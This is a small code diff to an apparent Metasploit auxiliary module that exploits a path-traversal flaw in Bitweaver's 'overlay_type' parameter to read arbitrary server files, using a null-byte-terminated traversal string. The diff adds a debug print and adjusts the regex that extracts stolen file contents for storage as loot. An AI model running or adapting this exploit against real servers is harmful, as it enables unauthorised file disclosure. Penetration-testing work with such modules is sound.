@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 				'overlay_type' => "#{traverse}#{fname}%00"
 			}
 		})
-
+		print_line(res.body)
 		if res and res.code == 200 and res.body =~ /failed to open stream\: No such file/
 			print_error("#{peer} - Cannot read '#{fname}'. File does not exist.")
 
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		elsif res and res.code == 200
 			data = res.body
-			data = data.scan(/(.+)\n(<br \/>\n)*.+Notice/m).flatten[0] || ''
+			data = (data.scan(/(.+)\n(<br \/>)*\n*.+Notice.+/m).flatten[0] || '').gsub(/\n<br \/>$/, '')
 
 			p = store_loot(
 				'bitweaver.overlay_type',
